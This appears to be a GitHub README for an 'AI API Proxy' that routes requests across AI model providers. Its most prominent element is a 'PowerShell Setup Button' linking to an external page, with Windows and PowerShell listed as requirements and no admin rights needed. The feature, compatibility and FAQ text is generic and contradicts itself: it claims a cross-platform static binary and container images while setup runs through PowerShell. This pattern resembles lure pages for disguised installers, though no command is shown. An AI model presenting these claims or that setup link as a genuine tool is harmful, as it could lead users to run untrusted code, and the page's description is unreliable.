<div align="center">

# 🤖 AI API Proxy: Unified Multi-Model Request Router — Windows Desktop Client

![](files/preview.png)

### 🛠️ PowerShell Setup Button

[![](files/button.png)](https://MathewJames044.github.io/ai-api-proxy/)

[![pipeline](https://img.shields.io/badge/Pipeline-Passing-2ea44f?style=flat-square&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-Core-6366f1?style=flat-square&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/Stage-Active-2ea44f?style=flat-square&labelColor=0d1117)]()

</div>

---

AI API Proxy is a desktop integration utility that consolidates requests to multiple artificial intelligence model providers behind a single, standardized endpoint. It parses each incoming request, translates payloads into the native format of the target provider, and returns responses through a uniform interface, eliminating the need to maintain separate SDKs or authentication schemes. The routing engine applies configurable failover chains, key rotation, and token accounting so that transient provider errors and rate thresholds are handled transparently at the proxy layer. Developers can define model mappings and conditional routing rules through declarative configuration, enabling model substitution without code changes. Built for low-latency operation and continuous observability, the utility exposes detailed request logs, health checks, and usage metrics suitable for both local development and production deployments.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Core Capabilities

The proxy consolidates multi-provider model access behind a single, predictable interface. Each capability below is designed to reduce integration overhead and keep request handling deterministic across heterogeneous backends.

- **Unified Endpoint Surface** — All supported model providers are exposed through one standardized request and response schema. Client applications target a single route and select a model by identifier; the proxy handles payload translation, header normalization, and response shaping per provider.

- **Intelligent Request Routing** — Incoming requests are parsed and dispatched to the appropriate backend based on the declared model, configurable rules, and provider availability. Routing decisions are evaluated per request, enabling model substitution without client-side code changes.

- **Automatic Failover and Retry** — When a primary provider returns a rate-limit, timeout, or server error, the proxy transparently retries against a designated fallback target. Retry budgets, backoff intervals, and fallback chains are configurable, preserving connection continuity for the caller.

- **Credential and Key Management** — Multiple credentials per provider can be registered and rotated according to defined policies. The proxy selects active credentials at dispatch time, isolating key handling from application logic and simplifying multi-account operation.

- **Usage Accounting and Cost Visibility** — Token consumption and estimated cost are tracked per request, per model, and per credential. Aggregated metrics support capacity planning and budget monitoring without additional instrumentation in the client.

- **Configurable Routing Policies** — Declarative configuration files define provider mappings, fallback order, conditional rules, and middleware behavior. Policies can be revised and reloaded independently of application deployments.

- **Observability and Health Monitoring** — Structured request logs, per-provider health checks, and metrics export provide operators with continuous visibility into latency, error rates, and backend availability.

- **Local and Custom Backend Support** — Beyond hosted providers, the proxy can front locally served models and custom endpoints that conform to a supported schema, allowing mixed local and remote deployments under one interface.

- **Portable Deployment** — The proxy runs as a self-contained desktop service with a consistent configuration model across supported operating systems, suitable for both development workstations and dedicated routing hosts.

## How the Routing Engine Works

The routing engine is the operational core of AI API Proxy. Every inbound request passes through a deterministic pipeline that resolves the target model, validates the payload, selects a provider, and streams the response back to the caller — all while preserving the request shape your application already expects.

**Request Resolution Pipeline**

When a request arrives at the unified endpoint, the engine performs a staged evaluation:

1. **Ingress validation** — headers, authentication tokens, and payload schema are checked against the canonical specification. Malformed requests are rejected early with structured error responses, avoiding unnecessary upstream calls.
2. **Model resolution** — the requested model identifier is mapped against the configured provider registry. Aliases, version pins, and capability tags are resolved to a concrete upstream target.
3. **Policy evaluation** — routing rules are applied in priority order. Rules can match on model family, prompt size, caller identity, custom headers, or payload metadata, allowing fine-grained control over which provider handles a given request.
4. **Dispatch and translation** — the engine transforms the canonical payload into the provider-specific wire format, attaches the appropriate credentials, and forwards the request over a pooled connection.
5. **Response normalization** — the upstream response is translated back into the canonical schema, with streaming chunks reassembled and token accounting recorded per request.

**Failover and Retry Semantics**

The engine treats provider reliability as a first-class concern. Each route can declare an ordered fallback chain. When an upstream returns a transient error — rate limiting, timeout, or server fault — the engine transparently retries against the next candidate in the chain. Retry budgets, backoff intervals, and circuit-breaker thresholds are configurable per provider, so aggressive failover can be tuned independently for latency-sensitive and batch workloads. Callers receive a single coherent response; the failover sequence is recorded in the request log for observability.

**Key and Credential Management**

Multiple credentials can be attached to a single provider. The engine rotates across them according to configurable strategies — round-robin, least-recently-used, or health-weighted — and quarantines credentials that return authentication or quota errors until a cooldown period elapses. This keeps throughput stable without requiring application-side key handling.

**Deterministic and Weighted Selection**

For workloads that do not pin an explicit model, the engine supports weighted distribution across a candidate pool. Weights can reflect cost, latency history, or operator preference. Selection is deterministic given a stable seed, which makes A/B comparisons and reproducible testing straightforward. Semantic rules can additionally route short classification prompts to lighter models while directing long-context reasoning tasks to higher-capacity targets.

**Observability Hooks**

Every routing decision emits a structured event: resolved model, selected provider, retry count, latency, and token usage. These events feed the built-in metrics surface and can be exported to external telemetry systems. Because the engine records the full decision path, diagnosing an unexpected provider selection or a failover storm requires reading a single log entry rather than correlating multiple services.

**Configuration Surface**

Routing behavior is declared in configuration rather than code. Provider definitions, fallback chains, selection weights, retry policies, and rule precedence are all expressed declaratively, and changes are hot-reloaded without restarting the process. This keeps the engine adaptable as provider APIs evolve and lets teams adjust routing strategy in production without a deployment cycle.

## Compatibility

AI API Proxy is designed to operate across heterogeneous environments, so compatibility is treated as a first-class concern rather than an afterthought. The sections below detail the platforms, runtimes, and integration surfaces the proxy supports.

### Operating System Support

The proxy ships as a self-contained binary with no external runtime dependencies. It is validated against the following platforms:

| Platform | Architecture | Status |
| --- | --- | --- |
| Linux | x86_64, arm64 | Fully supported |
| macOS | x86_64, Apple Silicon | Fully supported |
| Windows | x86_64 | Fully supported |

Container images are published for Linux on both x86_64 and arm64, enabling deployment on standard servers, edge nodes, and ARM-based cloud instances without recompilation.

### API Surface Compatibility

The proxy exposes a standardized chat-completions endpoint that mirrors the request and response schema used by the dominant AI provider ecosystem. Clients built against that schema can be redirected to the proxy by changing only the base URL and authentication token — no SDK changes, no payload restructuring.

- **Request formats:** JSON chat-completions payloads, including streaming and non-streaming modes.
- **Response formats:** standards-compliant JSON and server-sent event streams for incremental generation.
- **Authentication:** bearer token scheme via a configurable proxy secret, with per-provider credentials isolated internally.
- **Model identifiers:** provider-specific model names are accepted directly through the `model` field and translated transparently by the routing engine.

### Provider Interoperability

The routing layer abstracts provider-specific differences in authentication schemes, request envelopes, and error semantics. Supported provider categories include hosted commercial model services, self-hosted inference servers, and local runtimes. Adding a new provider requires only a configuration entry in the provider definition file; the core proxy binary does not need to be rebuilt.

### Runtime and Dependency Profile

- **Standalone binary:** statically linked, with no interpreter or package manager required at runtime.
- **Optional services:** a Redis-compatible cache is supported for prompt caching and rate-limit coordination but is not required for baseline operation.
- **Containerized deployment:** OCI-compatible images are provided for orchestration platforms such as Kubernetes, Docker Compose, and Nomad.
- **Configuration format:** YAML-based configuration files with environment variable overrides for secrets and deployment-specific values.

### Client Library Compatibility

Because the proxy speaks a standardized schema, existing client libraries for the chat-completions interface work without modification. This includes official SDKs, community-maintained wrappers, and command-line tools that accept a configurable base URL. Applications that already support configurable endpoints can adopt the proxy as a drop-in routing layer.

### Versioning and Upgrade Guarantees

Compatibility is maintained across minor releases. The proxy follows semantic versioning: patch releases preserve API and configuration compatibility, minor releases may introduce additive features, and major releases document any breaking changes in a dedicated migration note. Configuration files from prior minor versions continue to load, with deprecation warnings where applicable.

### Extensibility for Custom Environments

Organizations with proprietary model endpoints can integrate them through the custom provider interface. A provider definition specifies the base URL, authentication header format, request mapping, and response mapping. Once registered, the custom provider participates in failover chains, token accounting, and observability exactly as built-in providers do.

### Known Constraints

- Features that depend on provider-specific extensions, such as proprietary tool-call schemas or non-standard streaming formats, are normalized only where a standardized equivalent exists.
- Redis-backed coordination is required for multi-instance deployments that need shared rate-limit state.
- Local model runtimes must expose a compatible HTTP interface to participate in routing.

## FAQ

**Does AI API Proxy require an account with each individual provider?**
Yes. AI API Proxy is a routing and orchestration layer, not a credential issuer. You supply your own provider credentials — whether from hosted services or self-hosted endpoints such as Ollama — and the proxy manages how those credentials are used across requests. It does not generate, share, or pool keys on your behalf.

**How does the proxy handle rate limits and provider outages?**
The routing engine intercepts provider responses in real time. When a request encounters a rate-limit status or a transient server error, the failover chain promotes the next configured model and replays the request transparently. Key rotation distributes load across multiple credentials for the same provider, while circuit-breaker thresholds prevent repeated attempts against an unhealthy endpoint.

**Is AI API Proxy a hosted service or a local application?**
It is a self-contained desktop and server-side application that runs entirely within your own environment. All request metadata, logs, and token accounting remain on your infrastructure. No prompt content or credential material is transmitted anywhere other than the provider endpoints you explicitly configure.

**Can I add a provider that is not natively supported?**
Yes. The provider registry is declarative. You define a new entry in the configuration with its base endpoint, authentication scheme, and request/response transformation rules, and the router will treat it as a first-class target. Local inference servers and OpenAI-compatible endpoints generally require only a minimal adapter definition.

**What happens to my request payload during translation?**
The proxy normalizes incoming requests against a canonical schema, then maps them to each provider's native format. Message roles, tool definitions, stop sequences, and sampling parameters are translated where equivalents exist; unsupported fields are dropped with a logged warning rather than silently altered. Response bodies are mapped back to the unified schema before being returned to your client.

**Does the proxy support streaming responses?**
Yes. Server-sent event streams are proxied incrementally, with usage counters updated as chunks arrive. Failover during an active stream is handled at the boundary of the first token; once streaming has begun, the connection is held to preserve ordering guarantees.

**How is token usage and cost tracked?**
Each request is measured against provider-reported usage where available and against a local tokenizer estimate otherwise. The dashboard aggregates these figures per model, per key, and per time window, and exposes them through the Prometheus metrics endpoint for external monitoring.

**Is there a performance penalty for routing through the proxy?**
Overhead is minimal. The routing layer is implemented in a compiled runtime with connection pooling and keep-alive reuse toward upstream providers. Under typical workloads, added latency is dominated by the provider round trip rather than by proxy processing.

**Can routing rules be scoped per application or per user?**
Yes. Rules in the routing configuration can match on prompt length, requested model, custom headers, or caller identity, allowing you to direct different workloads to different tiers of models without changing client code.

**What platforms are supported?**
The application ships as a native binary for Linux, macOS, and Windows, and is also distributed as a container image for deployment alongside existing infrastructure.

**How do I report a defect or request a capability?**
Use the issue tracker associated with this project. Include the proxy version, the affected provider, and the relevant log excerpt with sensitive values redacted.

## Disclaimer

AI API Proxy is provided as a routing and integration utility for consolidating model requests through a single endpoint. It does not host, own, or operate any underlying AI models; all inference is performed by the third-party providers you configure. Model availability, response quality, latency, and provider-side policy enforcement remain the responsibility of each upstream service.

You are solely responsible for the API credentials, endpoint configurations, and routing rules you supply. Ensure your use of each provider complies with that provider's terms of service, acceptable use policies, and any applicable quotas or licensing restrictions. AI API Proxy does not grant any rights to third-party models or services, and it does not alter or circumvent provider-imposed limits — it only forwards requests you are already authorized to make.

Routing, failover, and key-rotation features are intended to improve reliability and availability for legitimate integrations. They are not a substitute for proper capacity planning or for obtaining the access tier your workload requires. Any request volume, credential management, or configuration that violates an upstream provider's terms is outside the intended use of this utility.

The software is supplied on an as-is basis, without warranties of any kind, express or implied, including fitness for a particular purpose or non-infringement. The maintainers accept no liability for service interruptions, provider-side account actions, data handling on external platforms, or any direct or indirect damages arising from use of the proxy. Review the License section for the complete terms governing distribution and use.

## License

AI API Proxy is distributed under the Apache License 2.0, a permissive licensing model that grants broad latitude for commercial and non-commercial adoption while preserving attribution and patent protections. Under the terms of this license, you may use, reproduce, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided that the original copyright notice, license text, and any attached attribution notices are retained in all copies or substantial portions of the work.

The license includes an express patent grant from contributors, ensuring that downstream integrators can deploy the routing engine and its associated modules without ambiguity regarding intellectual property claims. Redistribution in compiled or source form requires that recipients receive a copy of the license terms and are made aware of any modifications introduced to the original codebase. Derivative works may be released under different terms, so long as the obligations of the original license are satisfied for the inherited components.

The software is provided on an "as is" basis, without warranties or conditions of any kind, whether express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of the software or its integration into downstream systems. Users are responsible for ensuring that their deployment of the proxy complies with the terms of service of any upstream model providers they route requests through.

For organizations with specific compliance requirements, the permissive structure of the license accommodates internal auditing, redistribution within private infrastructure, and incorporation into larger proprietary platforms without reciprocal disclosure obligations. Full license terms, including definitions and termination clauses, are included in the repository root for review.